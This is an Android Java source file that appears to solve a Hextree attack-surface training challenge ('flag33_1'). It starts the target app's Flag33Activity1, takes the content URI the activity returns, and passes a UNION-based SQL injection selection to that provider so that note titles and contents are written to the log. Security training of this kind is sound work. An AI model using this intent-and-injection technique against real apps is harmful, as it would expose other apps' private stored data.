package com.android.zerohextree;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag331Binding;

public class flag33_1 extends AppCompatActivity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.setAction("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag33Activity1");
        startActivityForResult(intent, 1); // 'startActivityForResult', not 'startActivityForResults'

    }
    // Handle result from started activity
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (data != null && data.getData() != null) {
            ContentResolver resolver = getContentResolver();

            Cursor cursor = resolver.query(
                    data.getData(),
                    null,
                    "_id=2 UNION SELECT 1,title,content,'a' FROM Note", // Dangerous SQL injection-style query
                    null,
                    null
            );

            if (cursor != null) {
                String[] columnNames = cursor.getColumnNames(); // fixed typo getcoumnName -> getColumnNames
                while (cursor.moveToNext()) { // fixed typo moveNext -> moveToNext
                    for (String columnName : columnNames) {
                        String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
                        Log.i("QueryFlag33.1", columnName + ": " + value);
                    }
                }
                cursor.close();
            }
        }
    }


}